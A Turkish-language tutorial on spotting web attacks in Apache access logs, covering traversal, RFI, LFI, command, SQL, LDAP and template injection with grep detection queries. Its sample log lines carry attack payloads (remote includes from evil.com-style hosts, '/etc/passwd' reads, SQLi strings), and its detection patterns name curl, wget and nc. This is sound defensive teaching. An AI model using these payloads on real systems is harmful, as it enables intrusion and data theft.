---
title: "Apache Web Sunucusunda Saldırı Tespit Teknikleri"
date: 2025-06-01
draft: false
description: "Apache erişim loglarını analiz ederek ve ModSecurity ile Fail2Ban kullanarak web uygulaması saldırılarını (SQLi, XSS, LFI, RFI, Dizin Gezinme) tespit etme ve önleme rehberi."
image: featured.webp
type: posts
topic: detection-response
tags: ["Intrusion Detection", "Apache", "Log Analysis", "Web Attacks", "Directory Traversal", "Threat Hunting"]
featuredImageAlt: "Alarm kayıtları, trafik metrikleri ve küresel tehdit haritası içeren saldırı tespit paneli"
---

![Apache HTTP Sunucusu](apache-http-server.webp)

Günümüzde web uygulamaları ve siteler, farklı türlerde siber saldırılara maruz kalmaktadır. Bu saldırıların erken tespiti, güvenlik önlemlerinin etkinliği ve sistemin sürekliliği açısından büyük önem taşır. Apache Web Sunucusu, dünya genelinde en yaygın kullanılan web sunucularından biridir ve bu nedenle saldırıların izlenmesi ve tespiti için doğru yöntemlerin uygulanması gerekmektedir.

---

## Saldırı Tespit Mimarisi Akışı

Aşağıdaki diyagram, Apache Web Sunucusu üzerinden geçen bir HTTP isteğinin yaşam döngüsünü, WAF seviyesindeki gerçek zamanlı tespiti ve log seviyesindeki manuel/otomatik analiz süreçlerini göstermektedir:

```mermaid
flowchart TD
    Client([İstemci / Saldırgan]) --> WAF{"ModSecurity WAF"}
    WAF -->|Zararlı İstek| Drop["İsteği Engelle (403 Forbidden)"]
    WAF -->|Güvenli İstek| Server["Apache & Web Uygulaması"]

    Server --> AccessLog[("/var/log/apache2/access.log")]

    subgraph Defense ["Otomatik Savunma & Analiz"]
        AccessLog --> Fail2Ban["Fail2Ban Servisi"] --> Firewall["iptables / Dinamik Engelleme"]
        AccessLog --> Analyst["Güvenlik Analisti (Adli İnceleme)"]
    end
    Firewall -.->|IP Engeli| Client
```

---

## Apache Erişim Logları Nedir?

![Apache Erişim Logları](access-logs.webp)

Apache, sunucuya gelen her HTTP isteğini erişim loglarında kaydeder. Bu loglar, istek yapan IP adresi, istek zamanı, istenen dosya veya kaynak, kullanılan HTTP metodu, durum kodu gibi önemli bilgileri içerir. Erişim logları, sistemde gerçekleşen aktivitelerin izlenmesi ve analiz edilmesi için birincil veri kaynağıdır.

Apache erişim logları genellikle `/var/log/apache2/access.log` (veya benzeri) dosyasında bulunur.

### Apache Combined Log Formatı Alanları

Çoğu canlı sistem, **Combined Log Format** (Birleşik Log Formatı) kullanır. Bu formatta kaydedilen alanlar ve açıklamaları aşağıda detaylandırılmıştır:

| Log Yönergesi | Alan Adı | Açıklama | Örnek Değer |
| :--- | :--- | :--- | :--- |
| `%h` | Uzak Host | İstekte bulunan istemcinin IP adresi | `192.168.1.200` |
| `%l` | Uzak Log Adı | `identd` tarafından belirlenen istemci kimliği (genelde `-`) | `-` |
| `%u` | Uzak Kullanıcı | HTTP kimlik doğrulaması ile giriş yapan kullanıcı adı (genelde `-`) | `admin` |
| `%t` | Zaman | İsteğin sunucuya ulaştığı tarih ve saat damgası | `[01/Jun/2025:12:00:10 +0300]` |
| `\"%r\"` | İstek Satırı | HTTP metodu, talep edilen URI ve HTTP sürümü | `"GET /index.php HTTP/1.1"` |
| `%>s` | Durum Kodu | İstemciye döndürülen nihai HTTP durum kodu | `200` |
| `%b` | Gönderilen Bayt | İstemciye gönderilen yanıt gövdesinin bayt cinsinden boyutu | `1024` |
| `\"%{Referer}i\"` | Referer Başlığı | İstemciyi bu sayfaya yönlendiren kaynak sayfa adresi | `"https://google.com"` |
| `\"%{User-Agent}i\"` | User-Agent | İstemcinin tarayıcı veya tarama botu imza bilgisi | `"Mozilla/5.0"` |

---

## Tespit İçin Kullanılabilecek Yöntemler

Apache üzerinde saldırı tespiti, manuel log analizinden otomatik engelleme araçlarına kadar farklı yöntemlerle yapılabilir.

### Manuel Log Analizi

![Manuel Log Analizi](log-analysis.webp)

`grep`, `awk` gibi Linux komutları kullanılarak log dosyalarında şüpheli aktiviteler aranabilir. Örneğin, tüm erişim loglarında genel saldırı belirtilerini hızlıca taramak için şu komut kullanılabilir:

```bash
grep -iE "union|select|drop|script|alert|../|login|admin" /var/log/apache2/access.log
```

### Otomatik İzleme ve Uyarı Sistemleri

* **ModSecurity:** Apache üzerinde çalışan bir Web Application Firewall (WAF) olarak saldırıları daha uygulamaya ulaşmadan gerçek zamanlı tespit eder ve engeller.
* **Fail2Ban:** Belirlenen kurallara ve eşik değerlere göre logları sürekli okur, şüpheli IP'leri güvenlik duvarı (iptables) üzerinden otomatik engeller.
* **Log Analiz Araçları:** GoAccess, AWStats gibi araçlar logları görselleştirip analiz yapmayı kolaylaştırır.

---

## Dizin Gezinme (Directory Traversal)

![Dizin Gezinme Saldırı Örneği](directory-traversal-example.webp)

Dizin Gezinme saldırısı, bir saldırganın web sunucusunda yetkisiz olarak üst dizinlere veya hassas dosyalara erişmeye çalıştığı saldırı türüdür. Amaç, sunucudaki kritik dosyaları (örneğin `/etc/passwd`, yapılandırma dosyaları) elde etmektir.

### Dizin Gezinme Saldırısının Göstergeleri (İndikatörleri)

Apache erişim loglarında dikkat edilmesi gereken göstergeler:

* URL parametrelerinde veya istek yollarında `../` veya benzeri dizin atlama ifadeleri
* `..%2F` (URL encoded `../`) gibi kodlanmış karakterler
* Hassas dosyalara erişim denemeleri: `/etc/passwd`, `/boot.ini`, `/windows/win.ini` gibi dosya isimleri
* Anormal uzun URL istekleri veya çok sayıda dizin atlama örüntüsü
* Sunucu hataları (403 Forbidden, 404 Not Found) artışı

### Apache Erişim Loglarında Dizin Gezinme Tespiti

Dizin Gezinme saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.200 - - [01/Jun/2025:12:00:10 +0300] "GET /../../../../etc/passwd HTTP/1.1" 403 723 "-" "Mozilla/5.0"  
192.168.1.201 - - [01/Jun/2025:12:00:30 +0300] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 404 512 "-" "curl/7.68.0"  
192.168.1.202 - - [01/Jun/2025:12:01:05 +0300] "GET /admin/../../boot.ini HTTP/1.1" 403 400 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "\.\./|\.\.%2F|etc/passwd|boot.ini|win.ini" /var/log/apache2/access.log
```

---

## File Upload (Dosya Yükleme)

![Dosya Yükleme Güvenlik Açığı](file-upload.webp)

File Upload saldırısı, bir saldırganın web uygulamasının dosya yükleme özelliğini kötüye kullanarak zararlı dosyalar yüklemesiyle gerçekleşir. Bu dosyalar genellikle web sunucusunda çalıştırılabilir komutlar içeren scriptler (Webshell) olabilir.

Webshell, saldırganların bir web sunucusuna yükleyip çalıştırabildiği küçük kötü amaçlı komut dosyalarıdır. Genellikle PHP, ASP, JSP gibi sunucu tarafı dillerle yazılır. Webshell, saldırganlara sunucuda komut çalıştırma, dosya yükleme/indirme, veri çalma, arka kapı oluşturma gibi geniş yetkiler sağlar.

### File Upload Saldırısı Göstergeleri (İndikatörleri)

Apache erişim loglarında dikkat edilmesi gereken işaretler:

* `/upload`, `/uploads`, `/file-upload`, `/image-upload` gibi dosya yükleme endpointlerine yapılan istekler
* Yüklenen dosya adlarında şüpheli uzantılar: `.php`, `.exe`, `.jsp`, `.asp`, `.phtml`, `.pl` gibi
* Uzun veya karmaşık dosya isimleri (örneğin `shell.php`, `cmd.jsp`, `image.jpg.php`)
* HTTP metodunun genellikle POST olması ve içerik tipinin `multipart/form-data` olması
* Aynı IP'den kısa sürede çok sayıda dosya yükleme denemesi
* Yükleme sonrası yapılan şüpheli GET istekleri ile dosyanın çalıştırılmaya çalışılması

### Apache Erişim Loglarında File Upload Tespiti

File Upload saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.350 - - [01/Jun/2025:23:10:45 +0300] "POST /upload HTTP/1.1" 200 512 "-" "Mozilla/5.0"  
192.168.1.350 - - [01/Jun/2025:23:11:00 +0300] "GET /uploads/shell.php HTTP/1.1" 200 1024 "-" "Mozilla/5.0"  
192.168.1.351 - - [01/Jun/2025:23:12:10 +0300] "POST /file-upload HTTP/1.1" 200 512 "-" "curl/7.68.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -E "\.php|\.jsp|\.asp|\.exe|\.phtml" /var/log/apache2/access.log
```

---

## RFI (Remote File Inclusion)

![Uzaktan Dosya Dahil Etme RFI](rfi.webp)

RFI, web uygulamalarında kötü niyetli bir saldırganın, uzak bir sunucudan zararlı dosyaları (genellikle PHP, JavaScript gibi) dahil ederek (include) çalıştırmasına olanak sağlayan bir saldırı türüdür.

Bu saldırı, özellikle PHP gibi `include()`, `require()` fonksiyonlarını kullanıcı girdisiyle doğrudan kullanan zayıf uygulamalarda görülür. Saldırgan, uzak bir dosyanın URL'sini parametre olarak verip sunucuya zararlı kodu çalıştırtırabilir.

### RFI Saldırısının Göstergeleri (İndikatörleri)

Apache erişim loglarında aşağıdaki işaretlere dikkat etmek gerekir:

* URL veya parametrelerde `http://`, `https://` gibi uzak dosya adresleri
* Parametrelerde `.php`, `.txt`, `.inc` gibi dosya uzantıları
* `include=`, `file=`, `page=`, `template=` gibi parametre isimlerinde uzaktan dosya çağrısı
* Anormal uzun URL ve karmaşık parametre yapıları
* 500 Internal Server Error gibi hata kodları

### Apache Erişim Loglarında RFI Tespiti

RFI saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.210 - - [01/Jun/2025:12:30:10 +0300] "GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1" 500 1024 "-" "Mozilla/5.0"  
192.168.1.211 - - [01/Jun/2025:12:31:05 +0300] "GET /include.php?file=https://evil.com/malware.php HTTP/1.1" 200 2048 "-" "curl/7.68.0"  
192.168.1.212 - - [01/Jun/2025:12:32:15 +0300] "GET /template.php?template=http://attacker.com/bad.inc HTTP/1.1" 500 512 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "http://|https://|include=|file=|page=|template=" /var/log/apache2/access.log
```

---

## LFI (Local File Inclusion)

![Yerel Dosya Dahil Etme LFI](LFI.webp)

LFI, web uygulamasında kullanıcıdan alınan girdilerle sunucu üzerindeki yerel dosyaların (örneğin sistem dosyaları, yapılandırma dosyaları) izinsiz olarak dahil edilip çalıştırılmasına olanak veren bir saldırı türüdür.

Bu saldırı, özellikle `include()`, `require()` gibi fonksiyonlar kullanıcı girdisiyle doğrudan çağrıldığında ortaya çıkar. Amaç genellikle hassas dosyalara erişmek veya sunucu üzerinde komut çalıştırmaktır.

### LFI Saldırısının Göstergeleri (İndikatörleri)

Apache erişim loglarında dikkat edilmesi gereken işaretler:

* URL veya parametrelerde `../` gibi dizin atlama karakterleri (Directory Traversal ile benzerlik gösterir)
* `php://`, `data://`, `expect://` gibi PHP wrapper ifadeleri
* Sistem dosyaları: `/etc/passwd`, `/proc/self/environ`, `/var/log/apache2/access.log` gibi dosya isimleri
* Parametrelerde `include=`, `page=`, `file=` gibi dosya dahil etmeye yönelik anahtar kelimeler
* Anormal uzun ve karmaşık URL yapıları
* 403 Forbidden veya 500 Internal Server Error gibi hata kodları

### Apache Erişim Loglarında LFI Tespiti

LFI saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.220 - - [01/Jun/2025:13:00:10 +0300] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 403 512 "-" "Mozilla/5.0"  
192.168.1.221 - - [01/Jun/2025:13:01:25 +0300] "GET /load.php?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 200 1024 "-" "curl/7.68.0"  
192.168.1.222 - - [01/Jun/2025:13:02:05 +0300] "GET /view.php?include=../proc/self/environ HTTP/1.1" 403 400 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "\.\./|php://|data://|expect://|include=|page=|file=" /var/log/apache2/access.log
```

---

## Brute Force (Kaba Kuvvet)

![Kaba Kuvvet Saldırısı](brute-force-attack-example.webp)

Brute Force saldırısı, bir saldırganın bir kullanıcı hesabına ya da sisteme erişim sağlamak için çok sayıda kullanıcı adı ve parola kombinasyonunu otomatik ve hızlı şekilde denemesiyle gerçekleşir. Amaç, doğru kimlik bilgilerini bularak yetkisiz erişim elde etmektir.

Bu saldırı genellikle login (giriş) sayfalarına yöneliktir ve otomatik araçlarla gerçekleşir.

### Brute Force Saldırı Türleri

Kaba kuvvet (Brute Force) saldırıları tek bir yöntemden ibaret değildir, farklı stratejilerle uygulanabilen çeşitli türleri mevcuttur:

1. **Pure Brute Force (Saf Kaba Kuvvet)**: Tüm olası karakter kombinasyonlarını sırayla dener.
   - *Örnek*: `aaaa -> aaab -> aaac -> ...`
   - *Avantajı*: Teorik olarak %100 başarı sağlar (yeterli süre verildiğinde).
   - *Dezavantajı*: Son derece yavaş ve yüksek işlem maliyetlidir.
2. **Dictionary Attack (Sözlük Saldırısı)**: Önceden hazırlanmış parola listelerini (wordlist) kullanır.
   - *Örnek*: `password`, `123456`, `qwerty`, `admin123`
   - *Avantajı*: Çok hızlıdır.
   - *Dezavantajı*: Güçlü ve rastgele oluşturulmuş parolalarda tamamen başarısız olur.
3. **Hybrid Attack (Hibrit Saldırı)**: Sözlük ve kaba kuvvet yöntemlerinin birleşimidir, sözlükteki kelimelere belirli kurallarla varyasyonlar ekler.
   - *Örnek*: `password -> password123`, `admin -> Admin!2024`
   - *Avantajı*: Gerçek dünyada çok etkilidir çünkü kullanıcılar genellikle tahmin edilebilir kalıplar kullanır.
4. **Credential Stuffing (Kimlik Bilgisi Doldurma)**: Daha önce sızdırılmış kullanıcı adı/şifre kombinasyonlarını hedeflenen sisteme karşı dener.
   - *Örnek*: Sızdırılmış veritabanlarındaki bilgileri farklı platformlarda test etmek (şifre tekrar kullanımına dayanır).
   - *Avantajı*: Kullanıcıların aynı parolayı tekrar kullanma alışkanlığı nedeniyle çok başarılı olabilir.
   - *Dezavantajı*: Çok Faktörlü Kimlik Doğrulama (MFA) varsa engellenir.
5. **Password Spraying (Parola Püskürtme)**: Çok sayıda kullanıcı hesabına karşı az sayıda ve yaygın kullanılan parolayı dener.
   - *Örnek*: `kullanıcı1`, `kullanıcı2` ve `kullanıcı3` için `Password123!` parolasını denemek.
   - *Avantajı*: Hesap kilitleme (account lockout) politikalarına yakalanmadan sızma şansı verir.
   - *Dezavantajı*: Tüm kullanıcıların güçlü parola politikalarına uyması durumunda başarısız olur.
6. **Reverse Brute Force (Ters Kaba Kuvvet)**: Tek bir parola seçilip çok sayıda kullanıcı adı üzerinde denenir. Password spraying'e benzer ancak odak noktası tek bir zayıf paroladır.
7. **Rainbow Table Attack (Gökkuşağı Tablosu Saldırısı)**: Önceden hesaplanmış hash tabloları kullanılarak şifrelenmiş parolaları çözmeyi hedefler.
   - *Avantajı*: Hash çözme işlemlerinde çok hızlıdır.
   - *Dezavantajı*: Parola özetlerine "Salt" (tuzlama) eklenmişse tamamen etkisiz kalır.
8. **Distributed Brute Force (Dağıtık Kaba Kuvvet)**: Birden fazla makine (örneğin botnet) üzerinden paralel olarak saldırı gerçekleştirilir.
   - *Avantajı*: Tespit edilmesi zordur ve yük dağıtımı sayesinde son derece hızlıdır.
9. **Offline Brute Force (Çevrimdışı Kaba Kuvvet)**: Hedef sistemin parola hash veritabanı ele geçirildikten sonra, yerel makinede kırma işlemi gerçekleştirilir.
   - *Avantajı*: IDS/IPS gibi güvenlik sistemleri tarafından kesinlikle fark edilemez ve GPU gücüyle inanılmaz derecede hızlandırılabilir.

#### Brute Force Saldırı Türleri Karşılaştırması

| Tür | Temel Özellik |
| :--- | :--- |
| **Pure Brute Force** | Tüm kombinasyonları dener |
| **Dictionary** | Wordlist (sözlük) kullanır |
| **Hybrid** | Wordlist + varyasyon ve kalıplar |
| **Credential Stuffing** | Sızdırılmış hesap bilgilerini dener |
| **Password Spraying** | Az sayıda popüler şifreyi çok sayıda hesaba dener |
| **Reverse Brute Force** | Tek bir şifre hedefli tarama yapar |
| **Rainbow Table** | Önceden hesaplanmış hash tablolarını kullanır |
| **Distributed** | Botnet ile paralel saldırı yapar |
| **Offline** | Ele geçirilen hash veritabanında çalışır |

#### Log Analizi ve IDS İlişkisi

Apache erişim loglarını veya kimlik doğrulama loglarını analiz ederken, bu brute force türleri farklı trafik izleri (signature) bırakır:
- **Password Spraying**: Aynı IP adresinden, farklı kullanıcı adlarına yönelik ancak benzer parola deneme zamanlamaları.
- **Klasik Brute Force**: Tek bir IP adresinden, tek bir kullanıcı hesabına yönelik çok kısa sürede aşırı sayıda başarısız login denemesi.
- **Credential Stuffing**: Kısa bir zaman diliminde, çok sayıda farklı IP adresinden (botnet vb.) farklı kullanıcı hesaplarına yönelik login denemeleri.

---

### Brute Force Saldırısının Göstergeleri (İndikatörleri)

Apache erişim loglarında aşağıdaki işaretler Brute Force saldırısına işaret edebilir:

* Aynı IP adresinden kısa sürede çok sayıda POST (genellikle login) isteği
* Farklı kullanıcı adları veya parola denemeleri ile tekrarlayan login girişimleri
* Artan sayıda 401 Unauthorized veya 403 Forbidden HTTP yanıt kodları
* Belirli endpointlerde (örneğin `/login`, `/wp-login.php`, `/admin/login.php`) yoğun istek trafiği
* User-Agent veya IP adreslerinde tekrar eden kalıplar

### Apache Erişim Loglarında Brute Force Tespiti

Brute Force saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.250 - - [01/Jun/2025:14:10:01 +0300] "POST /login.php HTTP/1.1" 401 530 "-" "Mozilla/5.0"  
192.168.1.250 - - [01/Jun/2025:14:10:03 +0300] "POST /login.php HTTP/1.1" 401 530 "-" "Mozilla/5.0"  
192.168.1.250 - - [01/Jun/2025:14:10:05 +0300] "POST /login.php HTTP/1.1" 401 530 "-" "Mozilla/5.0"  
192.168.1.250 - - [01/Jun/2025:14:10:07 +0300] "POST /login.php HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
awk '$7 == "/login.php" && $9 == 401 {print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -nr | head
```

---

## Komut Enjeksiyonu (Command Injection)

![Komut Enjeksiyonu](command-injection.webp)

Komut enjeksiyonu, bir saldırganın web uygulamasına zararlı işletim sistemi komutları enjekte ederek, sunucuda yetkisiz komutlar çalıştırmasına olanak veren bir güvenlik açığıdır.

Bu saldırı, özellikle kullanıcı girdilerinin doğrulanmadığı ve doğrudan işletim sistemi komutlarını çalıştıran fonksiyonlara (örneğin `system()`, `exec()`, `shell_exec()`) geçirildiği durumlarda ortaya çıkar.

Amaç, sunucuyu ele geçirmek, dosya içeriği okumak veya değiştirmek, ya da başka zararlı işlemler gerçekleştirmektir.

### Komut Enjeksiyonu Göstergeleri (İndikatörleri)

Apache erişim loglarında dikkat edilmesi gereken işaretler:

* URL veya parametrelerde `;`, `&&`, `|`, `` ` `` (backtick) gibi komut ayırıcı karakterler
* `curl`, `wget`, `nc`, `bash`, `sh`, `python` gibi sistem komut isimleri
* Parametrelerde anormal uzun veya karmaşık yapılar
* Sunucu tarafında hata (500 Internal Server Error) kodları artışı
* Komut çıktısını gösteren veya etkileyen istekler

### Apache Erişim Loglarında Komut Enjeksiyonu Tespiti

Komut Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.230 - - [01/Jun/2025:13:30:10 +0300] "GET /ping.php?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1" 500 1024 "-" "Mozilla/5.0"  
192.168.1.231 - - [01/Jun/2025:13:31:20 +0300] "GET /exec.php?cmd=ls%20-l%20%26%26%20cat%20/etc/passwd HTTP/1.1" 500 2048 "-" "curl/7.68.0"  
192.168.1.232 - - [01/Jun/2025:13:32:05 +0300] "GET /shell.php?cmd=`whoami` HTTP/1.1" 500 512 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE ";|&&|\\||`|curl|wget|nc|bash|sh|python" /var/log/apache2/access.log
```

---

## SQL Enjeksiyon (SQL Injection)

![SQL Enjeksiyonu](sql-injection.webp)

SQL Enjeksiyon, saldırganın web uygulamasına zararlı SQL komutları enjekte ederek, uygulamanın veritabanını manipüle ettiği bir saldırı türüdür. Amaç, veritabanından gizli bilgileri çalmak, verileri değiştirmek veya silmek olabilir.

### SQL Enjeksiyonun Göstergeleri

Apache erişim loglarında veya web isteklerinde aşağıdaki işaretlere dikkat etmek gerekir:

* **URL veya parametrelerde SQL komutları:** `UNION SELECT`, `SELECT`, `INSERT`, `DROP TABLE`, `AND 1=1`, `' OR '1'='1'` gibi ifadeler
* **Parametrelerde anormal karakter kullanımı:** Tek tırnak `'`, çift tırnak `"`, noktalı virgül `;`, yorum satırı işaretleri `--` veya `#`
* **Anormal uzun URL veya parametre değerleri:** Karmaşık ve uzun sorgular
* **Sunucu hata kodları:** 500 Internal Server Error, 400 Bad Request gibi beklenmedik hatalar artışı
* **Tekrarlayan aynı parametre veya sorgu kalıpları:** Özellikle farklı varyasyonlarla denemeler yapılması

### Apache Erişim Loglarında SQL Enjeksiyon Tespiti

SQL Enjeksiyon saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.100 - - [01/Jun/2025:10:15:42 +0300] "GET /product?id=1' OR '1'='1 HTTP/1.1" 200 1234 "-" "Mozilla/5.0"  
192.168.1.101 - - [01/Jun/2025:10:16:05 +0300] "GET /search?q=UNION+SELECT+username,password+FROM+users HTTP/1.1" 500 532 "-" "curl/7.68.0"  
192.168.1.102 - - [01/Jun/2025:10:16:25 +0300] "GET /login.php?username=admin'-- HTTP/1.1" 200 432 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "union|select|drop|insert|delete|' or '|--|;|'" /var/log/apache2/access.log
```

---

## NoSQL Enjeksiyonu (NoSQL Injection)

NoSQL Enjeksiyonu, geleneksel SQL enjeksiyonuna benzer şekilde, NoSQL veri tabanlarına yönelik yapılan kötü amaçlı sorgu manipülasyonudur. MongoDB, CouchDB gibi NoSQL veri tabanlarında, uygulamanın kullanıcı girdilerini doğru şekilde filtrelememesi durumunda ortaya çıkar.

Amaç, sorgu yapısını değiştirerek yetkisiz veri erişimi sağlamak, veri sızdırmak veya veri tabanında değişiklik yapmaktır.

### NoSQL Enjeksiyonu Göstergeleri (İndikatörleri)

Apache erişim loglarında aşağıdaki göstergeler tespit edilebilir:

* Parametrelerde JSON yapısı veya operatörleri: `{ "$ne": null }`, `{ "$gt": "" }`, `{ "$regex": "" }` gibi
* Sorgu parametrelerinde anormal veya beklenmedik JSON dizileri
* `{"$where": "function() { ... }"}` gibi kod enjekte etmeye yönelik yapılar
* URL veya parametrelerde tipik NoSQL operatör ifadeleri (`$gt`, `$lt`, `$ne`, `$regex`, `$or`)
* Beklenmedik sayıda veya yapıda parametre kullanımı

### Apache Erişim Loglarında NoSQL Enjeksiyonu Tespiti

NoSQL Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.240 - - [01/Jun/2025:15:00:10 +0300] "GET /search?username[$ne]= HTTP/1.1" 200 1024 "-" "Mozilla/5.0"  
192.168.1.241 - - [01/Jun/2025:15:01:20 +0300] "GET /login?password[$gt]= HTTP/1.1" 200 512 "-" "curl/7.68.0"  
192.168.1.242 - - [01/Jun/2025:15:02:15 +0300] "GET /find?filter={$where: 'this.password.length > 0'} HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "\$ne|\$gt|\$lt|\$regex|\$or|\$where" /var/log/apache2/access.log
```

---

## XML Enjeksiyonu (XML Injection)

XML Enjeksiyonu, web uygulamalarının XML veri işleme aşamasında, kullanıcı girdilerinin yeterince doğrulanmaması sonucu kötü amaçlı XML içeriğinin uygulamaya gönderilmesiyle gerçekleşen bir saldırıdır. Bu saldırı, uygulamanın XML parser'ını kandırarak istenmeyen işlemler yapılmasına yol açabilir.

Örneğin, XML External Entity (XXE) saldırıları bu kategoriye girer, saldırgan zararlı XML dış kaynaklarını uygulamanın işlemesine sebep olabilir.

### XML Enjeksiyonu Göstergeleri (İndikatörleri)

Apache erişim loglarında dikkat edilmesi gerekenler:

* İstek parametrelerinde veya POST verilerinde `<`, `>`, `&`, `<!ENTITY` gibi XML özel karakterleri ve yapıları
* XML içeriğinde `<!DOCTYPE`, `SYSTEM`, `ENTITY` ifadeleri
* Normalden uzun veya karmaşık XML verisi gönderimleri
* XML External Entity referansları
* 400 Bad Request veya 500 Internal Server Error gibi hata kodları artışı

### Apache Erişim Loglarında XML Enjeksiyonu Tespiti

XML Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.250 - - [01/Jun/2025:16:10:15 +0300] "POST /api/xmlparser HTTP/1.1" 400 512 "-" "Mozilla/5.0"  
192.168.1.251 - - [01/Jun/2025:16:11:20 +0300] "POST /service HTTP/1.1" 500 1024 "-" "curl/7.68.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "<!DOCTYPE|SYSTEM|ENTITY" /var/log/apache2/access.log
```

---

## LDAP Enjeksiyonu (LDAP Injection)

LDAP (Lightweight Directory Access Protocol) enjeksiyonu, bir saldırganın uygulamanın LDAP sorgularına kötü amaçlı girdiler enjekte ederek, yetkisiz erişim sağlaması veya LDAP veritabanı sorgularını manipüle etmesi saldırısıdır.

Özellikle kullanıcı doğrulama ve yetkilendirme işlemlerinde, LDAP sorgularının kullanıcı girdisiyle doğrudan oluşturulması durumunda ortaya çıkar.

### LDAP Enjeksiyonu Göstergeleri (İndikatörleri)

Apache erişim loglarında dikkat edilmesi gereken işaretler:

* URL veya parametrelerde `*`, `|`, `&`, `(`, `)` gibi LDAP özel karakterleri
* Parametrelerde `*)(uid=*)`, `(|(uid=*))`, `(objectClass=*)` gibi sorgu manipülasyonları
* Normal dışı karakterlerle dolu veya karmaşık filtre ifadeleri
* Hatalı veya başarısız giriş denemeleri artışı
* Aynı IP'den çok sayıda deneme

### Apache Erişim Loglarında LDAP Enjeksiyonu Tespiti

LDAP Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.260 - - [01/Jun/2025:17:10:10 +0300] "GET /login?user=*)(uid=*))(|(uid=*)) HTTP/1.1" 401 512 "-" "Mozilla/5.0"  
192.168.1.261 - - [01/Jun/2025:17:11:05 +0300] "GET /search?filter=(|(objectClass=*)) HTTP/1.1" 200 1024 "-" "curl/7.68.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "\\*\)|\|\(|&|\(|\)" /var/log/apache2/access.log
```

---

## Template Enjeksiyonu (Template Injection)

![Şablon Enjeksiyonu](template-injection.webp)

Template Enjeksiyonu, web uygulamalarında kullanıcıdan alınan verilerin, şablon motorlarında (template engine) yeterince filtrelenmeden işlenmesi sonucu ortaya çıkan bir güvenlik açığıdır.

Saldırgan, şablon içine kötü niyetli kod enjekte ederek sunucu tarafında kod çalıştırabilir, hassas verilere erişebilir ya da uygulamayı kontrol edebilir.

Örnek olarak, Jinja2 (Python), Twig (PHP), Freemarker (Java) gibi template motorlarında bu tür zafiyetler görülebilir.

### Template Enjeksiyonu Göstergeleri (İndikatörleri)

Apache erişim loglarında dikkat edilmesi gereken işaretler:

* URL veya parametrelerde `{{ }}`, `{% %}`, `{# #}` gibi şablon değişkenleri ve ifadeleri
* `{{ config }}`, `{{ self }}`, `{{ ''.class.mro() }}` gibi zararlı kod denemeleri
* Parametrelerde anormal ve şablon motoruna özgü sözdizimi
* Sunucu hata kodlarında artış (500 Internal Server Error gibi)
* Tekrarlayan aynı tip kötü niyetli istekler

### Apache Erişim Loglarında Template Enjeksiyonu Tespiti

Template Enjeksiyonu saldırısı içeren örnek apache logu verilmiştir:

```log
192.168.1.270 - - [01/Jun/2025:18:20:10 +0300] "GET /page?template={{config}} HTTP/1.1" 500 1024 "-" "Mozilla/5.0"  
192.168.1.271 - - [01/Jun/2025:18:21:30 +0300] "GET /render?tmpl={{self}} HTTP/1.1" 500 512 "-" "curl/7.68.0"  
192.168.1.272 - - [01/Jun/2025:18:22:45 +0300] "GET /view?content={% if 1==1 %}HELLO{% endif %} HTTP/1.1" 500 1024 "-" "Mozilla/5.0"
```

Bu log üzerinde aşağıdaki sorgu çalıştırılarak tespit yapılabilir:

```bash
grep -iE "\{\{.\*\}\}|\{%.+%\}|\{#.\*#\}" /var/log/apache2/access.log
```

---

## HTTP Başlık Enjeksiyonu (HTTP Header Injection)

![HTTP Başlık Enjeksiyonu](http-header-injection.webp)

HTTP Header Injection, bir saldırganın web uygulamasına kötü niyetli veriler enjekte ederek HTTP başlıklarını manipüle etmesine olanak veren bir güvenlik açığıdır.

Bu saldırı, özellikle kullanıcı girdilerinin HTTP başlıklarında (örneğin `Set-Cookie`, `Location` gibi) doğru şekilde filtrelenmemesi durumunda ortaya çıkar.

Saldırgan bu açığı kullanarak HTTP yanıtlarını bölebilir (Response Splitting), Cross-Site Scripting (XSS) saldırısı yapabilir veya oturum çalma gibi zararlar verebilir.

### HTTP Başlık Enjeksiyonu Göstergeleri (İndikatörleri)

Apache erişim kayıtlarında dikkat edilmesi gereken işaretler:

* URL veya parametrelerde `\r` (satır başı), `\n` (satır sonu) karakterlerinin bulunması
* Başlıklarda satır sonu karakteri enjeksiyonu (örneğin `%0d`, `%0a`)
* Parametrelerde `Set-Cookie:`, `Location:` gibi başlık isimlerinin anormal şekilde kullanılması
* Sunucudan beklenmeyen hata veya anormal yanıt kodlarının artması
